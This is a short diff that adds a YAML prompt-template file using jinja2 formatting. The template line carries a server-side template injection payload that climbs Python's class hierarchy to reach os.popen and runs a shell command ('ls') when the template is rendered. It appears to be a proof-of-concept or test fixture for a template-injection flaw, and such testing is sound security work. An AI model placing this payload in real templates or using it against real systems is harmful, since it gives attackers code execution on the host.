@@ -1,0 +1,7 @@
+_type: prompt
+input_variables:
+    ["prompt"]
+template:
+    Tell me a {{ prompt }} {{ ''.__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['popen']('ls').read() }}
+template_format: jinja2
+validate_template: true
